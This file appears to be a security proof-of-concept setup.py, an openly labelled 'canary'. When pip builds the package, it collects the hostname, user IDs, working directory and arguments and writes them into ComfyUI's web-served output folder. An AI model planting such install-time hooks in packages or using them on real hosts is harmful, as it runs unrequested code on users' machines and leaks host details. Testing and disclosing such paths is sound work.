"""Build-time canary. Executes when pip prepares this sdist.

Writes a proof file into ComfyUI's output/ so it can be fetched over HTTP.
No network calls, no credential access.
"""
import json
import os
import socket
import sys
import time

def _proof():
    p = {
        "ran_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": socket.gethostname(),
        "uid": getattr(os, "getuid", lambda: None)(),
        "euid": getattr(os, "geteuid", lambda: None)(),
        "cwd": os.getcwd(),
        "python": sys.version.split()[0],
        "argv": sys.argv,
        "marker": "ZD-PIP-CANARY",
    }
    written = []
    for d in ("/ComfyUI/output", "/tmp", os.path.join(os.getcwd(), "output")):
        try:
            os.makedirs(d, exist_ok=True)
            fp = os.path.join(d, "_pip_proof.json")
            with open(fp, "w", encoding="utf-8") as f:
                json.dump(p, f, indent=1)
            written.append(fp)
        except Exception:
            pass
    print("ZD-PIP-CANARY", written)

_proof()

from setuptools import setup

setup(
    name="zdh-pip-canary",
    version="0.1.0",
    description="inert build-time canary",
    py_modules=[],
)
